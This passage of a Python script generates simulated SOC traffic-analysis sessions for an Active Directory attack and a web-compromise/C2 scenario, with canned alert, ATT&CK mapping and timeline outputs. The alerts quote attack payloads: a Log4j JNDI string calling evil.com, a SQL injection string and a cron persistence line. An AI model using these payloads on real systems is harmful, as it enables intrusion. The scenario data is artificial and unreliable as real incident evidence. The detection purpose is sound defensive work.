  Source: 10.10.10.99 | Technique: T1018
[HIGH] Alert #007: ADCS Attack - certificate enrollment abuse
  Rule: cert_abuse | Confidence: 0.80 | Event: [009]
  Source: 10.10.10.99 | Technique: T1649
[HIGH] Alert #008: Lateral Movement - WinRM from compromised host
  Rule: winrm_anomaly | Confidence: 0.78 | Event: [014]
  Source: 10.10.10.99 | Target: 10.10.10.10 | Technique: T1021
[MEDIUM] Alert #009: SMB SYSVOL access from non-domain host
  Rule: smb_anomaly | Confidence: 0.72 | Event: [010]
  Source: 10.10.10.99 | Target: 10.10.10.5
[MEDIUM] Alert #010: Multiple SPN TGS requests pattern
  Rule: kerb_anomaly | Confidence: 0.70 | Event: [006]
  Source: 10.10.10.99 | Target: 10.10.10.5
Summary: 4 critical | 4 high | 2 medium | Total: 10 alerts""",
        worker='rule_engine'))
    ts += 5.0

    # ===== STAGE 2: sem_analyst =====

    # 3. attck_map
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'attck_map',
        {'alerts': 10, 'framework': 'MITRE ATT&CK v15', 'mapping': 'auto+manual'},
        step,
        reasoning='[sem_analyst] ATT&CK技术映射阶段，将10条告警映射到MITRE ATT&CK框架，确定攻击者使用的具体技术和子技术。',
        output="""ATT&CK technique mapping (8 techniques identified):
1. T1558.003 - Steal or Forge Kerberos Credentials: Kerberoasting
   Mapped alerts: #003 (RC4 TGS spike)
   Evidence: TGS-REQ for MSSQLSvc SPN with RC4-HMAC downgrade

2. T1003.006 - OS Credential Dumping: DCSync
   Mapped alerts: #001 (DRSUAPI ReplicaSync)
   Evidence: DRSUAPI bind + ReplicaSync from non-DC host 10.10.10.99

3. T1558.004 - Steal or Forge Kerberos Credentials: AS-REP Roasting
   Mapped alerts: #004 (no-preauth AS-REQ)
   Evidence: AS-REQ without preauth for asmith (DONT_REQ_PREAUTH)

4. T1558.001 - Steal or Forge Kerberos Credentials: Golden Ticket
   Mapped alerts: #002 (10-year TGT)
   Evidence: TGS-REQ with forged TGT, 10-year validity, AES-256

5. T1649 - Steal or Forge Authentication Certificates: ADCS Attack
   Mapped alerts: #007 (cert enrollment abuse)
   Evidence: HTTP POST to /certsrv from non-domain host

6. T1021 - Remote Services: Lateral Movement
   Mapped alerts: #008 (WinRM), #009 (SMB SYSVOL)
   Evidence: WinRM to SQL01, SMB tree connect to SYSVOL

7. T1046 - Network Service Discovery: AD Reconnaissance
   Mapped alerts: #005 (DNS SRV enum)
   Evidence: DNS SRV query for _ldap._tcp from non-domain host

8. T1018 - Remote System Discovery: AD Enumeration
   Mapped alerts: #006 (LDAP queries)
   Evidence: LDAP search for users and computers from 10.10.10.99""",
        worker='sem_analyst'))
    ts += 5.0

    # 4. semantic_analyze
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'semantic_analyze',
        {'techniques': 8, 'alerts': 10, 'context': 'ad_domain_attack', 'correlation': True},
        step,
        reasoning='[sem_analyst] 语义研判阶段，基于ATT&CK映射结果进行深度语义分析，评估攻击意图、影响范围和威胁等级。',
        output="""Semantic analysis results:
Attack Intent: Active Directory Domain Compromise
Confidence: 0.96 (very high)
Kill Chain Phase: Exploitation -> Credential Access -> Lateral Movement -> Discovery

Threat Assessment:
  - Initial Access: AS-REP Roasting via no-preauth accounts
  - Credential Theft: Kerberoasting (RC4 downgrade) + DCSync
  - Privilege Escalation: Golden Ticket (10-year TGT)
  - Lateral Movement: WinRM + SMB to multiple hosts
  - Persistence: ADCS certificate abuse for persistent auth

Impact Assessment:
  - Affected Systems: DC01, SQL01, SYSVOL
  - Compromised Accounts: asmith, svc_mssql, krbtgt (hash), Administrator (forged)
  - Data Exposure: AD database (NTDS.dit) via DCSync
  - Domain Control: FULL (Golden Ticket = Domain Admin)

Severity Distribution:
  CRITICAL (4): DCSync, Golden Ticket, Kerberoasting, AS-REP Roasting
  HIGH (4): AD Recon, AD Enum, ADCS Attack, Lateral Movement
  MEDIUM (2): SMB SYSVOL access, SPN pattern anomaly

Verdict: COORDINATED AD DOMAIN ATTACK - Critical threat to domain integrity""",
        worker='sem_analyst'))
    ts += 5.0

    # ===== STAGE 3: chain_recon =====

    # 5. build_timeline
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'build_timeline',
        {'events': 14, 'alerts': 10, 'granularity': 'second', 'normalize': True},
        step,
        reasoning='[chain_recon] 时间线构建阶段，将14个流量事件和10条告警按时间排序，构建精确到秒的攻击时间线。',
        output="""Attack timeline reconstruction (14 events, 10 alerts):
T+00:00:00 [001] DNS SRV query -> AD Recon (T1046)
T+00:00:03 [002] LDAP bind -> AD Enum start (T1018)
T+00:00:05 [003] LDAP user search -> AD Enum (T1018)
T+00:00:12 [004] AS-REQ no-preauth -> AS-REP Roasting start (T1558.004)
T+00:00:13 [005] AS-REP response -> AS-REP hash captured (T1558.004)
T+00:00:45 [006] TGS-REQ MSSQLSvc -> Kerberoasting start (T1558.003)
T+00:00:46 [007] TGS-REP RC4-HMAC -> Kerberoast hash captured (T1558.003)
T+00:01:20 [008] LDAP computer search -> AD Enum continues (T1018)
T+00:02:15 [009] ADCS cert enrollment -> Certificate abuse (T1649)
T+00:03:30 [010] SMB SYSVOL connect -> Lateral access (T1021)
T+00:05:00 [011] DRSUAPI bind -> DCSync prep (T1003.006)
T+00:05:02 [012] ReplicaSync call -> DCSync execution (T1003.006)
T+00:08:30 [013] Forged TGS-REQ -> Golden Ticket use (T1558.001)
T+00:09:15 [014] WinRM SQL01 -> Lateral movement (T1021)
Total attack duration: 9 minutes 15 seconds""",
        worker='chain_recon'))
    ts += 5.0

    # 6. correlate_chain
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'correlate_chain',
        {'timeline_events': 14, 'method': 'graph_based', 'min_link_confidence': 0.75},
        step,
        reasoning='[chain_recon] 攻击链关联阶段，基于时间线进行图关联分析，将离散事件关联为完整的攻击链。',
        output="""Attack chain correlation (3 chains identified):

CHAIN 1: Credential Theft Chain (confidence: 0.97)
  [004] AS-REQ no-preauth -> [005] AS-REP hash -> [006] TGS-REQ -> [007] RC4 TGS hash
  Techniques: T1558.004 -> T1558.003
  Description: AS-REP Roasting followed by Kerberoasting to harvest credentials
  Duration: 34 seconds

CHAIN 2: Domain Compromise Chain (confidence: 0.95)
  [011] DRSUAPI bind -> [012] ReplicaSync -> [013] Forged TGS-REQ
  Techniques: T1003.006 -> T1558.001
  Description: DCSync to extract KRBTGT hash, then forge Golden Ticket
  Duration: 3 minutes 30 seconds

CHAIN 3: Reconnaissance Chain (confidence: 0.88)
  [001] DNS SRV -> [002] LDAP bind -> [003] LDAP users -> [008] LDAP computers
  Techniques: T1046 -> T1018
  Description: DNS reconnaissance followed by LDAP enumeration
  Duration: 1 minute 17 seconds

Cross-chain correlation:
  Chain 3 (Recon) -> Chain 1 (Cred Theft) -> Chain 2 (Domain Compromise)
  [009] ADCS enrollment and [010] SMB SYSVOL access are supporting events
  [014] WinRM is post-compromise lateral movement

Overall attack narrative: Recon -> Cred Harvest -> DCSync -> Golden Ticket -> Lateral""",
        worker='chain_recon'))
    ts += 5.0

    # ===== STAGE 4: report_writer =====

    # 7. compile_report
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'compile_report',
        {'chains': 3, 'alerts': 10, 'techniques': 8, 'format': 'json+markdown', 'severity': 'critical'},
        step,
        reasoning='[report_writer] 综合报告生成阶段，汇总4个分析阶段的全部结果，生成包含流量事件、告警、攻击链和ATT&CK映射的综合分析报告。',
        output="""Traffic analysis report compiled:
Scenario: AD Domain Attack Traffic Detection
Total traffic events analyzed: 14
Total alerts generated: 10 (4 critical, 4 high, 2 medium)
ATT&CK techniques mapped: 8
Attack chains reconstructed: 3
Pipeline execution time: 4 stages, 7 tool calls

Key Findings:
1. CRITICAL: DCSync attack via DRSUAPI from non-DC host (T1003.006)
2. CRITICAL: Golden Ticket with 10-year validity detected (T1558.001)
3. CRITICAL: Kerberoasting with RC4-HMAC downgrade (T1558.003)
4. CRITICAL: AS-REP Roasting of preauth-disabled accounts (T1558.004)
5. HIGH: ADCS certificate enrollment abuse (T1649)
6. HIGH: Lateral movement via WinRM and SMB (T1021)
7. HIGH: AD reconnaissance and enumeration (T1046, T1018)

Attack Narrative: DNS/LDAP recon -> AS-REP+Kerberoast cred harvest ->
DCSync KRBTGT extraction -> Golden Ticket forge -> WinRM lateral movement

Recommendation: Isolate source 10.10.10.99, rotate KRBTGT, audit ADCS
Report files: traffic_analysis.json, report.md, summary.json""",
        worker='report_writer'))
    ts += 5.0

    # ===== METRICS, REPORT, SUMMARY, TRAFFIC ANALYSIS =====
    agents = ['rule_engine', 'sem_analyst', 'chain_recon', 'report_writer']
    techniques_list = [
        {'id': 'T1558.003', 'name': 'Kerberoasting', 'desc': 'RC4-HMAC TGS票据请求针对SPN服务账户'},
        {'id': 'T1003.006', 'name': 'DCSync', 'desc': '通过DRSUAPI ReplicaSync从非DC主机提取域凭据'},
        {'id': 'T1558.004', 'name': 'AS-REP Roasting', 'desc': '针对DONT_REQ_PREAUTH账户的无预认证AS-REQ'},
        {'id': 'T1558.001', 'name': 'Golden Ticket', 'desc': '使用伪造的10年有效期TGT票据访问域资源'},
        {'id': 'T1649', 'name': 'ADCS Attack', 'desc': '通过证书服务注册滥用进行身份认证'},
        {'id': 'T1021', 'name': 'Lateral Movement', 'desc': '通过WinRM和SMB进行横向移动'},
        {'id': 'T1046', 'name': 'AD Reconnaissance', 'desc': 'DNS SRV记录枚举发现域服务'},
        {'id': 'T1018', 'name': 'AD Enumeration', 'desc': 'LDAP查询枚举域用户和计算机'},
    ]

    chain_summary = [
        '凭证窃取链: AS-REP Roasting -> Kerberoasting (T1558.004 -> T1558.003)',
        '域控攻陷链: DCSync -> Golden Ticket (T1003.006 -> T1558.001)',
        '侦察枚举链: DNS SRV -> LDAP Users -> LDAP Computers (T1046 -> T1018)',
        '跨链关联: 侦察 -> 凭证窃取 -> 域控攻陷 -> 横向移动',
    ]

    timeline_summary = [
        'T+00:00 DNS SRV查询 - AD侦察(T1046)',
        'T+00:03 LDAP绑定+用户查询 - AD枚举(T1018)',
        'T+00:12 AS-REQ无预认证 - AS-REP Roasting(T1558.004)',
        'T+00:45 TGS-REQ RC4降级 - Kerberoasting(T1558.003)',
        'T+02:15 ADCS证书注册滥用(T1649)',
        'T+05:00 DRSUAPI ReplicaSync - DCSync(T1003.006)',
        'T+08:30 伪造TGS-REQ - Golden Ticket(T1558.001)',
        'T+09:15 WinRM连接SQL01 - 横向移动(T1021)',
    ]

    traffic_events_data = [
        {'id': 1, 'time': 'T+00:00', 'proto': 'DNS', 'src': '10.10.10.99', 'dst': '10.10.10.5', 'desc': 'DNS SRV query _ldap._tcp', 'technique': 'T1046'},
        {'id': 2, 'time': 'T+00:03', 'proto': 'LDAP', 'src': '10.10.10.99', 'dst': '10.10.10.5:389', 'desc': 'LDAP bind request', 'technique': 'T1018'},
        {'id': 3, 'time': 'T+00:05', 'proto': 'LDAP', 'src': '10.10.10.99', 'dst': '10.10.10.5:389', 'desc': 'LDAP search (objectClass=user)', 'technique': 'T1018'},
        {'id': 4, 'time': 'T+00:12', 'proto': 'Kerberos', 'src': '10.10.10.99', 'dst': '10.10.10.5:88', 'desc': 'AS-REQ no-preauth asmith', 'technique': 'T1558.004'},
        {'id': 5, 'time': 'T+00:13', 'proto': 'Kerberos', 'src': '10.10.10.5', 'dst': '10.10.10.99:88', 'desc': 'AS-REP response with hash', 'technique': 'T1558.004'},
        {'id': 6, 'time': 'T+00:45', 'proto': 'Kerberos', 'src': '10.10.10.99', 'dst': '10.10.10.5:88', 'desc': 'TGS-REQ SPN MSSQLSvc', 'technique': 'T1558.003'},
        {'id': 7, 'time': 'T+00:46', 'proto': 'Kerberos', 'src': '10.10.10.5', 'dst': '10.10.10.99:88', 'desc': 'TGS-REP RC4-HMAC', 'technique': 'T1558.003'},
        {'id': 8, 'time': 'T+01:20', 'proto': 'LDAP', 'src': '10.10.10.99', 'dst': '10.10.10.5:389', 'desc': 'LDAP search (objectClass=computer)', 'technique': 'T1018'},
        {'id': 9, 'time': 'T+02:15', 'proto': 'HTTP', 'src': '10.10.10.99', 'dst': '10.10.10.5:445', 'desc': 'ADCS cert enrollment POST', 'technique': 'T1649'},
        {'id': 10, 'time': 'T+03:30', 'proto': 'SMB2', 'src': '10.10.10.99', 'dst': '10.10.10.5:445', 'desc': 'SMB2 tree connect SYSVOL', 'technique': 'T1021'},
        {'id': 11, 'time': 'T+05:00', 'proto': 'RPC', 'src': '10.10.10.99', 'dst': '10.10.10.5:135', 'desc': 'DRSUAPI RPC bind', 'technique': 'T1003.006'},
        {'id': 12, 'time': 'T+05:02', 'proto': 'RPC', 'src': '10.10.10.99', 'dst': '10.10.10.5:49154', 'desc': 'DRSUAPI ReplicaSync call', 'technique': 'T1003.006'},
        {'id': 13, 'time': 'T+08:30', 'proto': 'Kerberos', 'src': '10.10.10.99', 'dst': '10.10.10.5:88', 'desc': 'Forged TGS-REQ (Golden Ticket)', 'technique': 'T1558.001'},
        {'id': 14, 'time': 'T+09:15', 'proto': 'WinRM', 'src': '10.10.10.99', 'dst': '10.10.10.10:5985', 'desc': 'WinRM connect SQL01', 'technique': 'T1021'},
    ]

    alerts_data = [
        {'id': 1, 'severity': 'critical', 'title': 'DCSync attack - DRSUAPI ReplicaSync', 'technique': 'T1003.006', 'confidence': 0.98, 'events': [11, 12]},
        {'id': 2, 'severity': 'critical', 'title': 'Golden Ticket - TGT 10-year validity', 'technique': 'T1558.001', 'confidence': 0.95, 'events': [13]},
        {'id': 3, 'severity': 'critical', 'title': 'Kerberoasting - RC4-HMAC TGS spike', 'technique': 'T1558.003', 'confidence': 0.93, 'events': [6, 7]},
        {'id': 4, 'severity': 'critical', 'title': 'AS-REP Roasting - no-preauth AS-REQ', 'technique': 'T1558.004', 'confidence': 0.91, 'events': [4, 5]},
        {'id': 5, 'severity': 'high', 'title': 'AD Reconnaissance - DNS SRV enumeration', 'technique': 'T1046', 'confidence': 0.85, 'events': [1]},
        {'id': 6, 'severity': 'high', 'title': 'AD Enumeration - LDAP from non-domain host', 'technique': 'T1018', 'confidence': 0.82, 'events': [2, 3, 8]},
        {'id': 7, 'severity': 'high', 'title': 'ADCS Attack - certificate enrollment abuse', 'technique': 'T1649', 'confidence': 0.80, 'events': [9]},
        {'id': 8, 'severity': 'high', 'title': 'Lateral Movement - WinRM from compromised host', 'technique': 'T1021', 'confidence': 0.78, 'events': [14]},
        {'id': 9, 'severity': 'medium', 'title': 'SMB SYSVOL access from non-domain host', 'technique': None, 'confidence': 0.72, 'events': [10]},
        {'id': 10, 'severity': 'medium', 'title': 'Multiple SPN TGS requests pattern', 'technique': None, 'confidence': 0.70, 'events': [6]},
    ]

    attack_chains = [
        {'name': 'Credential Theft Chain', 'confidence': 0.97, 'events': [4, 5, 6, 7], 'techniques': ['T1558.004', 'T1558.003'], 'desc': 'AS-REP Roasting -> Kerberoasting'},
        {'name': 'Domain Compromise Chain', 'confidence': 0.95, 'events': [11, 12, 13], 'techniques': ['T1003.006', 'T1558.001'], 'desc': 'DCSync -> Golden Ticket'},
        {'name': 'Reconnaissance Chain', 'confidence': 0.88, 'events': [1, 2, 3, 8], 'techniques': ['T1046', 'T1018'], 'desc': 'DNS SRV -> LDAP enumeration'},
    ]

    traffic_analysis = {
        'scenario': 'ad_domain_attack',
        'title': 'AD域攻击流量检测',
        'traffic_events': traffic_events_data,
        'alerts': alerts_data,
        'attack_chains': attack_chains,
        'attck_techniques': techniques_list,
        'pipeline': {
            'stages': ['rule_engine', 'sem_analyst', 'chain_recon', 'report_writer'],
            'tool_calls': 7,
            'events_processed': 14,
            'alerts_generated': 10,
        },
        'summary': {
            'critical_alerts': 4,
            'high_alerts': 4,
            'medium_alerts': 2,
            'techniques_detected': 8,
            'chains_reconstructed': 3,
            'attack_duration': '9m15s',
            'source_ip': '10.10.10.99',
            'target_domain': 'cyberorion.local',
        },
    }

    metrics = {
        'traffic_events': 14,
        'alerts_total': 10,
        'alerts_critical': 4,
        'alerts_high': 4,
        'alerts_medium': 2,
        'attck_techniques': 8,
        'attack_chains': 3,
        'pipeline_agents': agents,
        'pipeline_stages': 4,
        'pipeline_tool_calls': 7,
        'total_events': len(lines),
    }

    report = _build_traffic_report(
        '流量分析 - AD域攻击检测', '流量分析 (AD Domain Attack)',
        14, 10, '4 critical, 4 high, 2 medium',
        techniques_list, agents, chain_summary, timeline_summary)

    summary = {
        'scenario': 'traffic_ad',
        'title': '流量分析 - AD域攻击检测',
        'type': 'traffic_analysis',
        'traffic_events': 14,
        'alerts': {'total': 10, 'critical': 4, 'high': 4, 'medium': 2},
        'attck_techniques': 8,
        'attack_chains': 3,
        'key_finding': '检测到完整的AD域攻击流量：DNS/LDAP侦察 -> AS-REP+Kerberoasting凭据窃取 -> DCSync提取KRBTGT -> Golden Ticket伪造 -> WinRM横向移动。4个CRITICAL告警覆盖核心攻击阶段，3条攻击链完整重建。',
        'source_ip': '10.10.10.99',
        'target_domain': 'cyberorion.local',
        'pipeline': 'rule_engine -> sem_analyst -> chain_recon -> report_writer',
    }

    _write_files(session_dir, lines, metrics, report, summary, traffic=traffic_analysis)


def gen_traffic_scenario_web(session_dir, base_ts):
    lines = []
    step = 0
    ts = base_ts

    # ===== STAGE 1: rule_engine =====
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'parse_traffic',
        {'pcap': 'web_attack_c2_traffic.pcap', 'filter': 'http||https||smb', 'time_window': '4h'},
        step,
        reasoning='[rule_engine] 流量解析阶段，从PCAP文件中解析HTTP/HTTPS和SMB协议流量，提取Web攻击和C2外联相关的双向网络事件。',
        output="""Traffic parsing results from web_attack_c2_traffic.pcap:
Total packets: 45,832 | Filtered: 3,214
Extracted 14 traffic events (bidirectional: inbound attack + outbound C2):
  [001] HTTP GET / from 203.0.113.50 (Recon)
  [002] HTTP POST /login UNION SELECT from 203.0.113.50 (SQLi)
  [003] HTTP 500 SQL error response to 203.0.113.50 (SQLi)
  [004] HTTP GET /api/v1/users from 203.0.113.50 (API enum)
  [005] HTTP GET / JNDI payload from 203.0.113.50 (Log4j)
  [006] HTTP 200 response to 203.0.113.50 (Log4j RCE success)
  [007] HTTP POST /upload cmd.php from 203.0.113.50 (Webshell)
  [008] HTTP 200 upload success to 203.0.113.50 (Webshell deployed)
  [009] HTTPS POST 10.20.20.20 -> 203.0.113.50:8443 (C2 beacon)
  [010] HTTPS GET response 203.0.113.50 -> 10.20.20.20 (C2 command)
  [011] SMB2 connect 10.20.20.20 -> 10.20.20.10:445 (Lateral)
  [012] HTTPS POST 2.3GB 10.20.20.20 -> 203.0.113.50:8443 (Exfil)
  [013] HTTP POST /schedule cron from 203.0.113.50 (Persistence)
  [014] HTTPS POST heartbeat 10.20.20.20 -> 203.0.113.50:8443 (C2)
Parsing complete: 14 bidirectional events ready for analysis""",
        worker='rule_engine'))
    ts += 5.0

    step += 1
    lines.extend(_tool_call(ts, 'blue', 'threshold_detect',
        {'events': 14, 'rules': 'sqli_pattern,log4j_jndi,webshell_upload,c2_beacon,data_exfil,smb_lateral', 'min_confidence': 0.65},
        step,
        reasoning='[rule_engine] 阈值检测阶段，对14个双向流量事件应用Web攻击和C2检测规则，生成告警。',
        output="""Threshold detection results (12 alerts generated):
[CRITICAL] Alert #001: SQL Injection - UNION SELECT in POST body
  Rule: sqli_pattern | Confidence: 0.97 | Event: [002],[003]
  Source: 203.0.113.50 | Payload: admin UNION SELECT 1,2,3--
  Technique: T1190
[CRITICAL] Alert #002: Log4j RCE - JNDI injection in User-Agent
  Rule: log4j_jndi | Confidence: 0.96 | Event: [005],[006]
  Source: 203.0.113.50 | Payload: jndi:ldap://evil.com/a
  Technique: T1190
[CRITICAL] Alert #003: Webshell upload - PHP file in upload
  Rule: webshell_upload | Confidence: 0.94 | Event: [007],[008]
  Source: 203.0.113.50 | File: cmd.php (PHP webshell signature)
  Technique: T1505.003
[CRITICAL] Alert #004: Data exfiltration - 2.3GB HTTPS POST
  Rule: data_exfil | Confidence: 0.93 | Event: [012]
  Source: 10.20.20.20 -> 203.0.113.50:8443 | Size: 2.3GB
  Technique: T1041
[HIGH] Alert #005: C2 beacon - regular HTTPS interval
  Rule: c2_beacon | Confidence: 0.88 | Event: [009]
  Source: 10.20.20.20 -> 203.0.113.50:8443 | Interval: 60s
  Technique: T1071
[HIGH] Alert #006: C2 command response pattern
  Rule: c2_beacon | Confidence: 0.85 | Event: [010]
  Source: 203.0.113.50 -> 10.20.20.20 | Pattern: request-response
  Technique: T1071
[HIGH] Alert #007: Lateral movement - SMB to internal server
  Rule: smb_lateral | Confidence: 0.82 | Event: [011]
  Source: 10.20.20.20 -> 10.20.20.10:445 | Share: ADMIN$
  Technique: T1021
[HIGH] Alert #008: Persistence - scheduled task creation
  Rule: persistence | Confidence: 0.80 | Event: [013]
  Source: 203.0.113.50 | Payload: cron job */5 * * * * /tmp/.update
  Technique: T1547
[MEDIUM] Alert #009: Web reconnaissance - directory scanning
  Rule: recon_pattern | Confidence: 0.75 | Event: [001]
  Source: 203.0.113.50 | Pattern: GET / with scanning UA
  Technique: T1046
[MEDIUM] Alert #010: API enumeration - endpoint discovery
  Rule: recon_pattern | Confidence: 0.72 | Event: [004]
  Source: 203.0.113.50 | Target: /api/v1/users
  Technique: T1046
[MEDIUM] Alert #011: SQL error disclosure - info leak
  Rule: sqli_pattern | Confidence: 0.68 | Event: [003]
  Source: 203.0.113.50 | Response: MySQL error in HTTP 500
  Technique: T1190
[MEDIUM] Alert #012: Regular HTTPS outbound pattern
  Rule: c2_beacon | Confidence: 0.66 | Event: [014]
  Source: 10.20.20.20 -> 203.0.113.50:8443 | Pattern: heartbeat
  Technique: T1071
Summary: 4 critical | 4 high | 4 medium | Total: 12 alerts""",
        worker='rule_engine'))
    ts += 5.0

    # ===== STAGE 2: sem_analyst =====
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'attck_map',
        {'alerts': 12, 'framework': 'MITRE ATT&CK v15', 'mapping': 'auto+manual'},
        step,
        reasoning='[sem_analyst] ATT&CK技术映射阶段，将12条告警映射到MITRE ATT&CK框架，确定Web攻击和C2通信的具体技术。',
        output="""ATT&CK technique mapping (8 techniques identified):
1. T1190 - Exploit Public-Facing Application
   Mapped alerts: #001 (SQLi), #002 (Log4j), #011 (SQL error)
   Evidence: UNION SELECT injection, JNDI payload in User-Agent
2. T1505.003 - Server Software Component: Web Shell
   Mapped alerts: #003 (webshell upload)
   Evidence: PHP file uploaded via /upload endpoint
3. T1071 - Application Layer Protocol: Web Protocols
   Mapped alerts: #005 (beacon), #006 (command), #012 (heartbeat)
   Evidence: Regular HTTPS communication to external IP 203.0.113.50
4. T1041 - Exfiltration Over C2 Channel
   Mapped alerts: #004 (2.3GB exfil)
   Evidence: Large HTTPS POST to C2 server, 2.3GB in 8 minutes
5. T1046 - Network Service Discovery
   Mapped alerts: #009 (dir scan), #010 (API enum)
   Evidence: Directory scanning and API endpoint enumeration
6. T1021 - Remote Services: SMB/Windows Admin Shares
   Mapped alerts: #007 (SMB lateral)
   Evidence: SMB2 connect to internal file server ADMIN$ share
7. T1547 - Boot or Logon Autostart Execution
   Mapped alerts: #008 (persistence)
   Evidence: Cron job creation via webshell for persistence
8. T1190 (variant) - Log4j RCE
   Mapped alerts: #002
   Evidence: JNDI payload in HTTP header exploiting Log4Shell""",
        worker='sem_analyst'))
    ts += 5.0

    step += 1
    lines.extend(_tool_call(ts, 'blue', 'semantic_analyze',
        {'techniques': 8, 'alerts': 12, 'context': 'web_attack_c2', 'correlation': True},
        step,
        reasoning='[sem_analyst] 语义研判阶段，基于ATT&CK映射结果进行深度语义分析，评估Web攻击的入侵路径、C2通信模式和数据泄露影响。',
        output="""Semantic analysis results:
Attack Intent: Web Application Compromise + C2 Establishment + Data Theft
Confidence: 0.95 (very high)
Kill Chain Phase: Recon -> Exploitation -> Installation -> C2 -> Actions on Objectives
Threat Assessment:
  - Initial Access: SQL injection in login form (T1190)
  - Exploitation: Log4j RCE via JNDI injection (T1190)
  - Installation: Webshell upload for persistent access (T1505.003)
  - C2 Channel: HTTPS beacon to 203.0.113.50:8443 (T1071)
  - Lateral Movement: SMB to internal file server (T1021)
  - Exfiltration: 2.3GB data via C2 channel (T1041)
  - Persistence: Cron job via webshell (T1547)
Impact Assessment:
  - Compromised System: WEB02 (10.20.20.20)
  - Lateral Target: FS01 (10.20.20.10) via SMB
  - Data Exfiltrated: 2.3GB (databases, configs, user data)
  - C2 Server: 203.0.113.50:8443 (HTTPS)
  - Persistence: Cron job */5 * * * * /tmp/.update
Severity: CRITICAL(4) HIGH(4) MEDIUM(4)
Verdict: WEB APPLICATION COMPROMISE WITH ACTIVE C2 - Critical data breach""",
        worker='sem_analyst'))
    ts += 5.0

    # ===== STAGE 3: chain_recon =====
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'build_timeline',
        {'events': 14, 'alerts': 12, 'granularity': 'second', 'normalize': True},
        step,
        reasoning='[chain_recon] 时间线构建阶段，将14个双向流量事件和12条告警按时间排序，构建精确到秒的攻击时间线。',
        output="""Attack timeline reconstruction (14 events, 12 alerts):
T+00:00:00 [001] HTTP GET / from 203.0.113.50 (Recon - T1046)
T+00:00:15 [002] HTTP POST /login SQLi from 203.0.113.50 (T1190)
T+00:00:16 [003] HTTP 500 SQL error to 203.0.113.50 (T1190)
T+00:00:30 [004] HTTP GET /api/v1/users from 203.0.113.50 (T1046)
T+00:02:00 [005] HTTP GET / JNDI payload from 203.0.113.50 (T1190)
T+00:02:01 [006] HTTP 200 Log4j RCE success (T1190)
T+00:05:00 [007] HTTP POST /upload cmd.php from 203.0.113.50 (T1505.003)
T+00:05:01 [008] HTTP 200 webshell deployed (T1505.003)
T+00:06:00 [009] HTTPS POST beacon 10.20.20.20 -> 203.0.113.50 (T1071)
T+00:06:05 [010] HTTPS GET command 203.0.113.50 -> 10.20.20.20 (T1071)
T+00:15:00 [011] SMB2 connect 10.20.20.20 -> 10.20.20.10 (T1021)
T+00:20:00 [012] HTTPS POST 2.3GB exfiltration (T1041)
T+00:25:00 [013] HTTP POST /schedule cron from 203.0.113.50 (T1547)
T+00:30:00 [014] HTTPS heartbeat 10.20.20.20 -> 203.0.113.50 (T1071)
Total attack duration: 30 minutes""",
        worker='chain_recon'))
    ts += 5.0

    step += 1
    lines.extend(_tool_call(ts, 'blue', 'correlate_chain',
        {'timeline_events': 14, 'method': 'graph_based', 'min_link_confidence': 0.75},
        step,
        reasoning='[chain_recon] 攻击链关联阶段，基于时间线进行图关联分析，将入站攻击流量和出站C2流量关联为完整攻击链。',
        output="""Attack chain correlation (3 chains identified):
CHAIN 1: Web Exploitation Chain (confidence: 0.96)
  [001] Recon -> [002] SQLi -> [005] Log4j RCE -> [007] Webshell upload
  Techniques: T1046 -> T1190 -> T1190 -> T1505.003
  Duration: 5 minutes
CHAIN 2: C2 Communication Chain (confidence: 0.94)
  [009] Beacon -> [010] Command -> [012] Data exfil -> [014] Heartbeat
  Techniques: T1071 -> T1071 -> T1041 -> T1071
  Duration: 24 minutes (ongoing)
CHAIN 3: Post-Exploitation Chain (confidence: 0.89)
  [011] SMB lateral -> [013] Persistence cron
  Techniques: T1021 -> T1547
  Duration: 10 minutes
Cross-chain: Chain1(Web) -> Chain3(Post-Exploit) -> Chain2(C2)
Overall: Web recon -> SQLi+Log4j -> Webshell -> C2 -> Lateral -> Exfil -> Persist""",
        worker='chain_recon'))
    ts += 5.0

    # ===== STAGE 4: report_writer =====
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'compile_report',
        {'chains': 3, 'alerts': 12, 'techniques': 8, 'format': 'json+markdown', 'severity': 'critical'},
        step,
        reasoning='[report_writer] 综合报告生成阶段，汇总4个分析阶段的全部结果，生成包含双向流量事件、告警、攻击链和ATT&CK映射的综合分析报告。',
        output="""Traffic analysis report compiled:
Scenario: Web Attack + C2 Exfiltration Traffic Detection
Total traffic events analyzed: 14 (bidirectional)
Total alerts generated: 12 (4 critical, 4 high, 4 medium)
ATT&CK techniques mapped: 8
Attack chains reconstructed: 3
Key Findings:
1. CRITICAL: SQL Injection (UNION SELECT) - T1190
2. CRITICAL: Log4j RCE via JNDI injection - T1190
3. CRITICAL: PHP webshell uploaded - T1505.003
4. CRITICAL: 2.3GB data exfiltration via C2 - T1041
5. HIGH: C2 beacon to 203.0.113.50:8443 - T1071
6. HIGH: SMB lateral movement - T1021
7. HIGH: Cron-based persistence - T1547
8. MEDIUM: Web recon and API enumeration - T1046
Attack Narrative: Web recon -> SQLi+Log4j -> Webshell -> C2 -> Lateral -> Exfil -> Persist
Recommendation: Block 203.0.113.50, remove webshell, patch SQLi+Log4j
Report files: traffic_analysis.json, report.md, summary.json""",
        worker='report_writer'))
    ts += 5.0

    # ===== METRICS, REPORT, SUMMARY, TRAFFIC ANALYSIS =====
    agents = ['rule_engine', 'sem_analyst', 'chain_recon', 'report_writer']
    techniques_list = [
        {'id': 'T1190', 'name': 'SQL Injection', 'desc': '通过UNION SELECT注入攻击登录表单获取数据库访问'},
        {'id': 'T1190', 'name': 'Log4j RCE', 'desc': '通过User-Agent头注入JNDI payload实现远程代码执行'},
        {'id': 'T1505.003', 'name': 'Webshell', 'desc': '通过文件上传接口部署PHP WebShell建立持久化访问'},
        {'id': 'T1071', 'name': 'C2 Beacon', 'desc': '通过HTTPS协议与C2服务器建立定期信标通信'},
        {'id': 'T1041', 'name': 'Data Exfiltration', 'desc': '通过C2通道外发2.3GB数据'},
        {'id': 'T1046', 'name': 'Web Reconnaissance', 'desc': '目录扫描和API端点枚举'},
        {'id': 'T1021', 'name': 'Lateral Movement', 'desc': '通过SMB协议横向移动到内部文件服务器'},
